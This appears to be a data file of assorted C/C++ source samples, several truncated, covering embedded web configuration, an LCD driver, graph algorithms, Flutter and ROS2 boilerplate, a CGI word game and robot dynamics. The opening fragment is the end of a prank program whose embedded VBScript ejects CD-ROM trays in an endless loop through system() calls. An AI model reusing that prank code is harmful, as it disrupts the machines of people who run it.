colCDROMs=oWMP.cdromCollection\\ndo\\nif colCDROMs.Count>=1 thenFor i=0 to coCDROMs.Count -1ColCDROMs.ltem<i>.Eject\\nNext\\nFor =0 to colCDROMs.Count -1ColCDROMs.ltem<i>.EjectNext\\nEnd lf\\nwscript.sleep 100\\nLoop\\n\";\n\tsystem(Command7);//\u8702\u9e23\u5668\u53d1\u58f0\n\treturn 0;\n}",
    "#include \"EEPROMConfig.h\"\r\n#include \"web.h\"\r\n#include <regex>\r\n\r\nextern EEPROMConfig config;\r\nextern const char* endMarker;\r\n\r\nconst char* getTemplateString(const char* key, const char* name2html[][2]) {\r\n  // n^2 but hey ho\r\n  for (int i=0; strcmp(endMarker, name2html[i][0]) != 0; i++) {\r\n    if (strcmp(name2html[i][0], key) == 0) {\r\n      return name2html[i][1];\r\n    }\r\n  }\r\n\r\n  return endMarker;\r\n}\r\n\r\n/**\r\n * Render one item\r\n */\r\nvoid render(AsyncResponseStream *response, BaseConfigItem* item, const char* htmlTemplate) {\r\n  // The HTML element template we are trying to render\r\n  String html = htmlTemplate;\r\n\r\n  // Get the item value as a string (as everything in HTML is a string)\r\n  String itemValue = item->toString();\r\n\r\n  // This is for HTML controls that use the 'selected' property\r\n  // We want to replace %selected==some value% with 'selected' if itemValue is 'some value'\r\n  String selected = \"%selected==\" + itemValue + \"%\";\r\n  html.replace(selected, \"selected\");\r\n\r\n  // Same, but for HTML controls that use the 'checked' property. Sigh.\r\n  selected = \"%checked==\" + itemValue + \"%\";\r\n  html.replace(selected, \"checked\");\r\n\r\n  // Now replace '{v}' in the template with itemValue, if '{v}' is in the template\r\n  html.replace(\"{v}\", itemValue);\r\n\r\n  // Now we want to get rid of all the %selected==some other value% strings\r\n  std::regex pattern(\"%selected==[^%]+%\");\r\n  std::string result = std::regex_replace(html.c_str(), pattern, \"\");\r\n\r\n  // Same for checked\r\n  pattern = \"%checked==[^%]+%\";\r\n  result = std::regex_replace(result, pattern, \"\");\r\n\r\n  // Finally send this string to the browser\r\n  response->printf(result.c_str());\r\n}\r\n\r\n/**\r\n * Render the whole root page\r\n */\r\nvoid handleRoot(AsyncWebServerRequest *request, BaseConfigItem* rootConfig, const char* name2html[][2]) {\r\n  Serial.println(\"Handling /\");\r\n\tAsyncResponseStream *response = request->beginResponseStream(\"text/html\");\r\n\r\n  // Send everything up to the body\r\n\tresponse->print(R_SCALES_WEB_HTTP_HEAD);\r\n\tresponse->print(R_SCALES_WEB_HTTP_SCRIPT);\r\n\tresponse->print(R_SCALES_WEB_HTTP_STYLE);\r\n\tresponse->print(R_SCALES_WEB_HTTP_HEAD_END);\r\n\r\n  // Send anything we want at the top of the page\r\n\tresponse->print(\"<h1>\");\r\n\tresponse->print(\"SmartSocket 12 digit Clock\");\r\n\tresponse->print(\"</h1>\");\r\n\r\n  // Send the form that will end up POSTing to /save\r\n  response->print(R_SCALES_WEB_HTTP_FORM_START);\r\n\r\n  // Send all the elements in the form\r\n  for (int i=0; strcmp(endMarker, name2html[i][0]) != 0; i++) {\r\n    BaseConfigItem* item = rootConfig->get(name2html[i][0]);\r\n    if (item != 0) {\r\n      render(response, item, name2html[i][1]);\r\n    }\r\n  }\r\n\r\n  // Done with the form\r\n  response->print(R_SCALES_WEB_HTTP_FORM_END);\r\n\r\n  // We could send some more HTML that we want at the end of the page here\r\n\r\n  response->print(\"<br>\");\r\n\r\n  response->print(\"- 2024 - https://www.panaplex.co.uk\");\r\n\r\n  // Finish up the web page\r\n\tresponse->print(R_SCALES_WEB_HTTP_END);\r\n\r\n  // Send it all to the browser\r\n\trequest->send(response);\r\n}\r\n\r\n/**\r\n * The root page does a POST to http://<ip address>/save. Extract all the form\r\n * values and send a re-direct to a page that just says 'saved...'\r\n */\r\n\r\nvoid handleSave(AsyncWebServerRequest *request, BaseConfigItem* rootConfig) {\r\n  // Loop through all the config items\r\n  rootConfig->forEach([request](BaseConfigItem& item) {\r\n\r\n    // If the POST from the browser has a value for this config item...\r\n    if(request->hasParam(item.name, true)) {\r\n      // Retrieve value from POST...\r\n      const char* value = request->getParam(item.name, true)->value().c_str();\r\n      Serial.printf(\"POST[%s]: %s\\n\", item.name, value);\r\n\r\n      // And set the config item value\r\n      item.fromString(value);\r\n    } else {\r\n      // Sigh. If an HTML checkbox is not checked, the POST won't contain any value for it,\r\n      // so we assume that it was unchecked and we further assume that the config item\r\n      // is a boolean that should be set to false\r\n      item.fromString(\"false\");\r\n    }\r\n\r\n    // Mark the config item to be saved to EEPROM\r\n    item.put();\r\n  });\r\n\r\n  // Save all the config items to EEPROM\r\n  config.commit();\r\n\r\n  // Display the 'Saved...' message for a short time\r\n  request->redirect(\"/saved\");\r\n}\r\n\r\n\r\n/**\r\n * Display 'saved...' for 3 seconds then redirect back to root\r\n */\r\nvoid handleSaved(AsyncWebServerRequest *request, BaseConfigItem* rootConfig) {\r\n\tAsyncResponseStream *response = request->beginResponseStream(\"text/html\");\r\n\r\n  // This R\"(...)\" syntax is a string literal. Anything between those brackets is used verbatim, newlines and all\r\n\tresponse->print(R\"(\r\n    <html lang=\"en\">\r\n    <head>\r\n      <meta name=\"viewport\" content=\"width=device-width, initial-scale=1, user-scalable=no\"/>\r\n      <meta http-equiv=\"refresh\" content=\"3; url=/\" />\r\n      <title>Panaplex Clock</title>\r\n    </head>\r\n    <body>\r\n    <p style=\"text-align: center;;font-family:verdana;font-size:1em;\">Saved...</p>\r\n    </body>\r\n    </html>\r\n    )\"\r\n ",
    "#include \"LiquidCrystal.h\"\n\n#include <stdio.h>\n#include <string.h>\n#include <inttypes.h>\n#include \"Arduino.h\"\n\n// When the display powers up, it is configured as follows:\n//\n// 1. Display clear\n// 2. Function set:\n//    DL = 1; 8-bit interface data\n//    N = 0; 1-line display\n//    F = 0; 5x8 dot character font\n// 3. Display on/off control:\n//    D = 0; Display off\n//    C = 0; Cursor off\n//    B = 0; Blinking off\n// 4. Entry mode set:\n//    I/D = 1; Increment by 1\n//    S = 0; No shift\n//\n// Note, however, that resetting the Arduino doesn't reset the LCD, so we\n// can't assume that its in that state when a sketch starts (and the\n// LiquidCrystal constructor is called).\n\nLiquidCrystal::LiquidCrystal(uint8_t rs, uint8_t rw, uint8_t enable,\n\t\t\t     uint8_t d0, uint8_t d1, uint8_t d2, uint8_t d3,\n\t\t\t     uint8_t d4, uint8_t d5, uint8_t d6, uint8_t d7)\n{\n  init(0, rs, rw, enable, d0, d1, d2, d3, d4, d5, d6, d7);\n}\n\nLiquidCrystal::LiquidCrystal(uint8_t rs, uint8_t enable,\n\t\t\t     uint8_t d0, uint8_t d1, uint8_t d2, uint8_t d3,\n\t\t\t     uint8_t d4, uint8_t d5, uint8_t d6, uint8_t d7)\n{\n  init(0, rs, 255, enable, d0, d1, d2, d3, d4, d5, d6, d7);\n}\n\nLiquidCrystal::LiquidCrystal(uint8_t rs, uint8_t rw, uint8_t enable,\n\t\t\t     uint8_t d0, uint8_t d1, uint8_t d2, uint8_t d3)\n{\n  init(1, rs, rw, enable, d0, d1, d2, d3, 0, 0, 0, 0);\n}\n\nLiquidCrystal::LiquidCrystal(uint8_t rs,  uint8_t enable,\n\t\t\t     uint8_t d0, uint8_t d1, uint8_t d2, uint8_t d3)\n{\n  init(1, rs, 255, enable, d0, d1, d2, d3, 0, 0, 0, 0);\n}\n\nvoid LiquidCrystal::init(uint8_t fourbitmode, uint8_t rs, uint8_t rw, uint8_t enable,\n\t\t\t uint8_t d0, uint8_t d1, uint8_t d2, uint8_t d3,\n\t\t\t uint8_t d4, uint8_t d5, uint8_t d6, uint8_t d7)\n{\n  _rs_pin = rs;\n  _rw_pin = rw;\n  _enable_pin = enable;\n\n  _data_pins[0] = d0;\n  _data_pins[1] = d1;\n  _data_pins[2] = d2;\n  _data_pins[3] = d3;\n  _data_pins[4] = d4;\n  _data_pins[5] = d5;\n  _data_pins[6] = d6;\n  _data_pins[7] = d7;\n\n  if (fourbitmode)\n    _displayfunction = LCD_4BITMODE | LCD_1LINE | LCD_5x8DOTS;\n  else\n    _displayfunction = LCD_8BITMODE | LCD_1LINE | LCD_5x8DOTS;\n\n  begin(16, 1);\n}\n\nvoid LiquidCrystal::begin(uint8_t cols, uint8_t lines, uint8_t dotsize) {\n  if (lines > 1) {\n    _displayfunction |= LCD_2LINE;\n  }\n  _numlines = lines;\n\n  setRowOffsets(0x00, 0x40, 0x00 + cols, 0x40 + cols);\n\n  // for some 1 line displays you can select a 10 pixel high font\n  if ((dotsize != LCD_5x8DOTS) && (lines == 1)) {\n    _displayfunction |= LCD_5x10DOTS;\n  }\n\n  pinMode(_rs_pin, OUTPUT);\n  // we can save 1 pin by not using RW. Indicate by passing 255 instead of pin#\n  if (_rw_pin != 255) {\n    pinMode(_rw_pin, OUTPUT);\n  }\n  pinMode(_enable_pin, OUTPUT);\n\n  // Do these once, instead of every time a character is drawn for speed reasons.\n  for (int i=0; i<((_displayfunction & LCD_8BITMODE) ? 8 : 4); ++i)\n  {\n    pinMode(_data_pins[i], OUTPUT);\n   }\n\n  // SEE PAGE 45/46 FOR INITIALIZATION SPECIFICATION!\n  // according to datasheet, we need at least 40ms after power rises above 2.7V\n  // before sending commands. Arduino can turn on way before 4.5V so we'll wait 50\n  delayMicroseconds(50000);\n  // Now we pull both RS and R/W low to begin commands\n  digitalWrite(_rs_pin, LOW);\n  digitalWrite(_enable_pin, LOW);\n  if (_rw_pin != 255) {\n    digitalWrite(_rw_pin, LOW);\n  }\n\n  //put the LCD into 4 bit or 8 bit mode\n  if (! (_displayfunction & LCD_8BITMODE)) {\n    // this is according to the hitachi HD44780 datasheet\n    // figure 24, pg 46\n\n    // we start in 8bit mode, try to set 4 bit mode\n    write4bits(0x03);\n    delayMicroseconds(4500); // wait min 4.1ms\n\n    // second try\n    write4bits(0x03);\n    delayMicroseconds(4500); // wait min 4.1ms\n\n    // third go!\n    write4bits(0x03);\n    delayMicroseconds(150);\n\n    // finally, set to 4-bit interface\n    write4bits(0x02);\n  } else {\n    // this is according to the hitachi HD44780 datasheet\n    // page 45 figure 23\n\n    // Send function set command sequence\n    command(LCD_FUNCTIONSET | _displayfunction);\n    delayMicroseconds(4500);  // wait more than 4.1ms\n\n    // second try\n    command(LCD_FUNCTIONSET | _displayfunction);\n    delayMicroseconds(150);\n\n    // third go\n    command(LCD_FUNCTIONSET | _displayfunction);\n  }\n\n  // finally, set # lines, font size, etc.\n  command(LCD_FUNCTIONSET | _displayfunction);\n\n  // turn the display on with no cursor or blinking default\n  _displaycontrol = LCD_DISPLAYON | LCD_CURSOROFF | LCD_BLINKOFF;\n  display();\n\n  // clear it off\n  clear();\n\n  // Initialize to default text direction (for romance languages)\n  _displaymode = LCD_ENTRYLEFT | LCD_ENTRYSHIFTDECREMENT;\n  // set the entry mode\n  command(LCD_ENTRYMODESET | _displaymode);\n\n}\n\nvoid LiquidCrystal::setRowOffsets(int row0, int row1, int row2, int row3)\n{\n  _row_offsets[0] = row0;\n  _row_offsets[1] = row1;\n  _row_offsets[2] = row2;\n  _row_offsets[3] = row3;\n}\n\n/********** high level commands, for the user! */\nvoid LiquidCrystal::clear()\n{\n  command(LCD_CLEARDISPLAY);  // clear display, set cursor ",
    "// NAME: GAL BEN AMI\n\n#include <climits>\n#include \"Algorithms.hpp\"\n#include \"Graph.hpp\"\n#include <queue>\n#include <limits>\n#include <vector>\n#include <set>\n#include <algorithm>\n\nusing namespace std;\nusing namespace ariel;\n\n/*\n Enum to represent the color of a vertex in the graph\n used in the cycle detection algorithm\n*/\nenum Color\n{\n    WHITE,\n    GRAY,\n    BLACK\n};\n\n/*\n Helper function to construct the path from the parent array\n*/\nstring constructPath(const vector<int> &parent, int start, int end)\n{\n    if (parent[(size_t)end] == -1)\n    {\n        return \"No path found\";\n    }\n\n    string path = to_string(end);\n    while (end != start)\n    {\n        end = parent[(size_t)end];\n        path = to_string(end) + \"->\" + path;\n    }\n    return path;\n}\n\n// Helper function to construct the cycle path\n// The cycle path is constructed from the cyclePath vector\nstring cycleConstructor(vector<int> &cyclePath, int startingVertex)\n{\n    string cycle;\n    size_t start = 0;\n    for (start = 0; start < cyclePath.size(); start++)\n    {\n        if (cyclePath[start] == startingVertex)\n        {\n            break;\n        }\n    }\n    for (size_t j = start; j < cyclePath.size(); j++)\n    {\n        cycle = cycle + to_string(cyclePath[j]) + \"->\";\n    }\n    cycle = cycle + to_string(startingVertex);\n    return cycle;\n}\n\n// BFS function\nstring BFS(Graph &graph, int start, int end)\n{\n    vector<vector<int>> adjMatrix = graph.getAdjacencyMatrix();\n    size_t numVertices = graph.getNumVertices();\n    vector<int> parentVertx(numVertices, -1);\n    vector<bool> visited(numVertices, false);\n    queue<int> queue;\n    // Mark the start vertex as visited\n    visited[(size_t)start] = true;\n    // Set the parentVertxious node of the start vertex as itself\n    // parentVertx[start] = start;\n    // Add the start vertex to the queue\n    queue.push(start);\n\n    // While the queue is not empty\n    while (!queue.empty())\n    {\n        // Get the front vertex of the queue\n        int current = queue.front();\n        // Remove the front vertex from the queue\n        queue.pop();\n\n        // If the current vertex is the end vertex, break the loop\n        if (current == end)\n        {\n            break;\n        }\n\n        // For each vertex in the graph\n        for (size_t i = 0; i < numVertices; ++i)\n        {\n            // If the current vertex is connected to the i-th vertex and the i-th vertex is not visited\n            if (adjMatrix[(size_t)current][i] != 0 && !visited[i])\n            {\n                // Add the i-th vertex to the queue\n                queue.push((int)i);\n                // Mark the i-th vertex as visited\n                visited[i] = true;\n                // Set the parentVertxious node of the i-th vertex as the current vertex\n                parentVertx[i] = current;\n            }\n        }\n    }\n\n    return constructPath(parentVertx, start, end);\n}\n\n// Dijkstra function\nstring Dijkstra(Graph &graph, int start, int end)\n{\n    size_t numVertices = graph.getNumVertices();\n    vector<bool> visited(numVertices, false);\n    vector<int> distance(numVertices, INT_MAX);\n    vector<int> parentVertx(numVertices, -1);\n\n    // Initialize the priority queue for Dijkstra's algorithm\n    priority_queue<pair<int, int>, vector<pair<int, int>>, greater<pair<int, int>>> pq;\n\n    // Initialize the distance of the start vertex as 0\n    distance[(size_t)start] = 0;\n    // Add the start vertex to the priority queue\n    pq.push({0, start});\n\n    // While the priority queue is not empty\n    while (!pq.empty())\n    {\n        // Get the vertex with the smallest distance\n        int u = pq.top().second;\n        // Remove the vertex from the priority queue\n        pq.pop();\n\n        // If the vertex has been visited, skip it\n        if (visited[(size_t)u])\n        {\n            continue;\n        }\n        // Mark the vertex as visited\n        visited[(size_t)u] = true;\n\n        // For each vertex in the graph\n        for (size_t v = 0; v < numVertices; ++v)\n        {\n            // If the u-th vertex is connected to the v-th vertex and the v-th vertex is not visited\n            if (graph.getAdjacencyMatrix()[(size_t)u][v] != 0 && !visited[v])\n            {\n                // Calculate the new distance to the v-th vertex\n                int newdistance = distance[(size_t)u] + graph.getAdjacencyMatrix()[(size_t)u][v];\n                // If the new distance is smaller than the current distanceance\n                if (newdistance < distance[v])\n                {\n                    // Update the distance to the v-th vertex\n                    distance[v] = newdistance;\n                    // Set the parentVertxious node of the v-th vertex as the u-th vertex\n                    parentVertx[v] = u;\n                    // Add the v-th vertex to the priority queue\n                    pq.push({distance[v], v});\n                }\n            }\n        }\n    }\n    // at this stage, parentVertx contains the shortest path from start to end\n    return constructPath(paren",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"contacts\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <cstdlib>\n#include <string>\n#include <vector>\n#include <algorithm>\n#include <sstream>\n#include <ctime> // For randomization\n#include <cgicc/Cgicc.h>\n#include <cgicc/HTTPHTMLHeader.h>\n#include <cgicc/FormEntry.h>\n#include <cgicc/HTTPStatusHeader.h>\n\nusing namespace cgicc;\nstd::string trim(const std::string& str) {\n    size_t start = str.find_first_not_of(\" \\t\\n\\r\");\n    size_t end = str.find_last_not_of(\" \\t\\n\\r\");\n    return (start == std::string::npos || end == std::string::npos) ? \"\" : str.substr(start, end - start + 1);\n}\n\nstd::vector<std::string> generateRandomGrid(int rows, int cols) {\n    std::vector<std::string> grid(rows);\n    std::srand(std::time(0)); // Seed for random generation\n\n    for (int i = 0; i < rows; ++i) {\n        std::string row;\n        for (int j = 0; j < cols; ++j) {\n            char randomLetter = 'A' + (std::rand() % 26); // Random letter from A-Z\n            row += randomLetter;\n        }\n        grid[i] = row;\n    }\n\n    return grid;\n}\n\nint countWordInGrid(const std::vector<std::string>& grid, const std::string& word) {\n    int count = 0;\n    std::string upperWord = word;\n    std::transform(upperWord.begin(), upperWord.end(), upperWord.begin(), ::toupper);\n\n    for (const auto& row : grid) {\n        std::string upperRow = row;\n        std::transform(upperRow.begin(), upperRow.end(), upperRow.begin(), ::toupper);\n        for (size_t i = 0; i <= upperRow.length() - upperWord.length(); i++) {\n            if (upperRow.substr(i, upperWord.length()) == upperWord) {\n                count++;\n            }\n        }\n    }\n\n    for (size_t col = 0; col < grid[0].length(); col++) {\n        for (size_t row = 0; row <= grid.size() - upperWord.length(); row++) {\n            std::string verticalSegment;\n            for (size_t k = 0; k < upperWord.length(); k++) {\n                verticalSegment += grid[row + k][col];\n            }\n            std::transform(verticalSegment.begin(), verticalSegment.end(), verticalSegment.begin(), ::toupper);\n            if (verticalSegment == upperWord) {\n                count++;\n            }\n        }\n    }\n\n    return count;\n}\n\nint main() {\n    try {\n        Cgicc cgi;\n        std::cout << HTTPHTMLHeader() << std::endl;\n\n        std::string gridType = cgi(\"gridType\");\n        std::string searchWord = trim(cgi(\"searchWord\"));\n\n        std::vector<std::string> grid;\n\n        if (gridType == \"generate\") {\n            int rows = std::stoi(cgi(\"rows\"));\n            int cols = std::stoi(cgi(\"columns\"));\n\n            grid = generateRandomGrid(rows, cols);\n        } else {\n            const_file_iterator file = cgi.getFile(\"gridFile\");\n            if (file != cgi.getFiles().end()) {\n                std::istringstream stream((*file).getData());\n                std::string line;\n                while (std::getline(stream, line)) {\n                    if (!line.empty()) {\n                        grid.push_back(line);\n                    }\n                }\n            }\n        }\n\n        int wordCount = countWordInGrid(grid, searchWord);\n\n        std::cout << \"<html lang=\\\"en\\\">\\n\";\n        std::cout << \"<head>\\n\";\n        std::cout << \"<title>Pattern Match Game Result</title>\\n\";\n        std::cout << \"<style>\\n\";\n        std::cout << \"body { font-family: Arial, sans-serif; background: #f5f5f5; color: #333; text-align: center; }\\n\";\n        std::cout << \".container { max-width: 600px; margin: 20px auto; padding: 20px; background-color white; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2); }\\n\";\n        std::cout << \".content { padding: 20px; text-align: center; }\\n\";\n        std::cout << \"pre { background: #f0f0f0; border: 1px solid #ddd; padding: 10px; border-radius: 5px; font-size: 1.25em; }\\n\"; \n        std::cout << \"</style>\\n\";\n        std::cout << \"</head>\\n\";\n        std::cout << \"<body>\\n\";\n        std::cout << \"<div class='container'>\\n\";\n        std::cout << \"<h1>Pattern Match Game Result</h1>\\n\";\n        std::cout << \"<div class='content'>\\n\";\n        std::cout << \"<pre>\\n\";\n        for (const auto& row : grid) {\n            std::cout << row << \"\\n\";\n        }\n        std::cout << \"</pre>\\n\";\n        std::cout << \"<p>Occurrences of the word '\" << searchWord << \"': \" << wordCount << \"</p>\\n\";\n        std::cout << \"</div>\\n\";\n        std::cout << \"</div>\\n\";\n        std::cout << \"</body>\\n\";\n        std::cout << \"</html>\\n\";\n    } catch (const std::exception& e) {\n        std::cout << \"Content-Type: text/plain\\n\\n\";\n        std::cout << \"Error: \" << e.what() << std::endl;\n    }\n\n    return 0;\n}\n\n",
    "#include \"srbd.hpp\"\n\n#include <proxsuite/proxqp/dense/dense.hpp>\n\nnamespace srbd {\n    using qp_t = proxsuite::proxqp::dense::QP<double>;\n    using qp_mat_t = proxsuite::proxqp::dense::Mat<double>;\n    using qp_vec_t = proxsuite::proxqp::dense::Vec<double>;\n\n    SingleRigidBodyDynamics::SingleRigidBodyDynamics(const SingleRigidBodyDynamics& other)\n    {\n        // TO-DO: This is not the best way to handle this!! BUT should be okay for now..\n        operator=(other);\n    }\n\n    SingleRigidBodyDynamics& SingleRigidBodyDynamics::operator=(const SingleRigidBodyDynamics& other)\n    {\n        // COM state\n        _base_position = other._base_position;\n        _base_vel = other._base_vel;\n        _base_orientation = other._base_orientation;\n        _base_angular_vel = other._base_angular_vel;\n\n        // Feet state\n        _feet_positions = other._feet_positions;\n        _feet_phases = other._feet_phases;\n\n        // Static ref poses/bounds\n        _feet_ref_positions = other._feet_ref_positions;\n        _feet_min_bounds = other._feet_min_bounds;\n        _feet_max_bounds = other._feet_max_bounds;\n\n        // Phase Handler\n        _phase_handler = std::move(other._phase_handler->clone());\n\n        // Terrain\n        _terrain = std::move(other._terrain->clone());\n\n        // General state\n        _mass = other._mass;\n        _inertia = other._inertia;\n        _inertia_inv = other._inertia_inv;\n\n        // Global variables\n        _dt = other._dt;\n        _g = other._g;\n        _gravity = other._gravity;\n\n        // Helper variables\n        _last_qp_result_valid = other._last_qp_result_valid;\n\n        return *this;\n    }\n\n    void SingleRigidBodyDynamics::set_sim_data(double dt, double gravity)\n    {\n        _dt = dt;\n        _g = std::abs(gravity);\n        _gravity = Vec3d(0, 0, -_g);\n    }\n\n    void SingleRigidBodyDynamics::set_inertial_data(double mass, const RotMat& inertia)\n    {\n        _mass = mass;\n        _inertia = inertia;\n        _inertia_inv = inertia.inverse();\n    }\n\n    void SingleRigidBodyDynamics::set_feet_data(const std::vector<Vec3d>& feet_ref_positions, const std::vector<Vec3d>& feet_min_bounds, const std::vector<Vec3d>& feet_max_bounds)\n    {\n        assert((_feet_ref_positions.size() == _feet_min_bounds.size() == _feet_max_bounds.size()) && \"Not consistent number of feet!\");\n        _feet_ref_positions = feet_ref_positions;\n        _feet_min_bounds = feet_min_bounds;\n        _feet_max_bounds = feet_max_bounds;\n    }\n\n    void SingleRigidBodyDynamics::set_data(const Vec3d& base_position, const Vec3d& base_velocity, const RotMat& base_orientation, const Vec3d& base_angular_velocity, const std::vector<Vec3d>& feet_positions, const std::vector<size_t>& feet_phases)\n    {\n        // Base-related\n        _base_position = base_position;\n        _base_vel = base_velocity;\n        _base_orientation = base_orientation;\n        _base_angular_vel = base_angular_velocity;\n\n        // Feet-related\n        assert(feet_positions.size() == _feet_ref_positions.size() && feet_phases.size() == _feet_ref_positions.size() && \"Wrong number of feet!\");\n        _feet_positions = feet_positions;\n        _feet_phases = feet_phases;\n    }\n\n    void SingleRigidBodyDynamics::set_base_position(const Vec3d& pos) { _base_position = pos; }\n\n    void SingleRigidBodyDynamics::set_base_velocity(const Vec3d& vel) { _base_vel = vel; }\n\n    void SingleRigidBodyDynamics::set_base_orientation(const RotMat& rot) { _base_orientation = rot; }\n\n    void SingleRigidBodyDynamics::set_base_angular_velocity(const Vec3d& ang_vel) { _base_angular_vel = ang_vel; }\n\n    void SingleRigidBodyDynamics::set_feet_positions(const std::vector<Vec3d>& feet_positions)\n    {\n        assert(feet_positions.size() == _feet_ref_positions.size() && \"Wrong number of feet!\");\n        _feet_positions = feet_positions;\n    }\n\n    void SingleRigidBodyDynamics::set_feet_phases(const std::vector<size_t>& feet_phases)\n    {\n        assert(feet_phases.size() == _feet_ref_positions.size() && \"Wrong number of feet!\");\n        _feet_phases = feet_phases;\n    }\n\n    std::tuple<Matrix, Matrix, Vector> SingleRigidBodyDynamics::linearize() const\n    {\n        const size_t n_dim = 9;\n        const size_t n_feet = _feet_ref_positions.size();\n        const size_t m_dim = n_feet * 3;\n\n        Matrix L_c = skew(_base_angular_vel) * (_inertia - skew(_inertia * _base_angular_vel)); // optimal gain\n        // State Space Model X_n+1 = A*X_n + B*U_n\n        // Define A Matrix\n        Matrix A = Matrix::Zero(n_dim, n_dim);\n        // Block of size (p,q), starting at (i,j)\tmatri_block(i,j,p,q); matri_block<p,q>(i,j);\n        A.block(0, 0, 3, 3) = Matrix::Identity(3, 3);\n        A.block(0, 3, 3, 3) = Matrix::Identity(3, 3) * _dt;\n        A.block(3, 3, 3, 3) = Matrix::Identity(3, 3);\n        A.block(6, 6, 3, 3) = Matrix::Identity(3, 3) - _dt * _inertia_inv * L_c;\n\n        // Define B Matrix\n        Matrix B = Matrix::Zero(n_dim, m_dim);\n        B.block(0, 0, 3, 3 * n_feet) = kron((((0.5 * _",
    "#include \"rclcpp/rclcpp.hpp\"\n#include \"std_msgs/msg/string.hpp\"\n#include \"std_msgs/msg/int32.hpp\"\n#include \"geometry_msgs/msg/vector3.hpp\"\n#include <memory>\n#include <chrono>\n#include <functional>\n//#include <string>\nusing namespace std::chrono_literals;\nvoid callback(rclcpp::Node::SharedPtr node, rclcpp::Publisher<geometry_msgs::msg::Vector3>::SharedPtr pub)\n{\n    //static int count;\n    //auto message = std_msgs::msg::String();\n    auto input = geometry_msgs::msg::Vector3();\n    std::cin >> input.x;\n    std::cin >> input.y;\n    std::cin >> input.z;\n    //message.data = \"Hello world! \" + std::to_string(count++);\n    RCLCPP_INFO(node->get_logger(), \"Publish: %f %f %f\", input.x, input.y, input.z);\n    pub->publish(input);\n    \n}\nint main(int argc, char* argv[])\n{\n    rclcpp::init(argc, argv);\n    auto node = std::make_shared<rclcpp::Node>(\"mynode\");\n    auto qos_profile = rclcpp::QoS(rclcpp::KeepLast(10));\n    auto pub = node->create_publisher<geometry_msgs::msg::Vector3>(\"mytopic\", qos_profile);\n    std::function<void()> fn = std::bind(callback, node, pub);\n    auto timer = node->create_wall_timer(1s, fn);\n    rclcpp::spin(node);\n    rclcpp::shutdown();\n    return 0;\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"sandy\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"ofApp.h\"\n\n//--------------------------------------------------------------\nvoid ofApp::setup()\n{\n    // basic settings\n    const int numInChannels = 0; // number of audio input channels to use\n    const int numOutChannels = 2; // number of audio output channels to use\n    const int sampleRate = 44100; // audio sample rate\n    const int ticksPerBuffer = 8; // used to compute the audio buffer len: tpb * blocksize (always 64)\n    const bool bOpenMidiInPort = false; // whether to open midi input port in init()\n    const bool bOpenMidiOutPort = false; // whether to open midi output port in init()\n    const int midiInPortNum = 0; // midi input port number to open\n    const int midiOutPortNum = 0; // midi output port number to open\n    const bool bOpenPatch = true; // whether to open a patch in init()\n    const string &patchName = \"pd/main.pd\"; // path of the patch to open (relative to \"project/bin/data\")\n    \n    // init ofelia\n    if (!ofelia.init(numInChannels, numOutChannels,\n                     sampleRate, ticksPerBuffer,\n                     bOpenMidiInPort, bOpenMidiOutPort,\n                     midiInPortNum, midiOutPortNum,\n                     bOpenPatch, patchName))\n    {\n        OF_EXIT_APP(1);\n    }\n    ofelia.setup();\n}\n\n//--------------------------------------------------------------\nvoid ofApp::update()\n{\n    ofelia.update();\n}\n\n//--------------------------------------------------------------\nvoid ofApp::draw()\n{\n    ofelia.draw();\n}\n\n//--------------------------------------------------------------\nvoid ofApp::exit()\n{\n    ofelia.exit();\n    \n    // clear resources\n    ofelia.clear();\n}\n\n//--------------------------------------------------------------\nvoid ofApp::keyPressed(ofKeyEventArgs &e)\n{\n    ofelia.keyPressed(e);\n}\n\n//--------------------------------------------------------------\nvoid ofApp::keyReleased(ofKeyEventArgs &e)\n{\n    ofelia.keyReleased(e);\n}\n\n//--------------------------------------------------------------\nvoid ofApp::mouseMoved(ofMouseEventArgs &e)\n{\n    ofelia.mouseMoved(e);\n}\n\n//--------------------------------------------------------------\nvoid 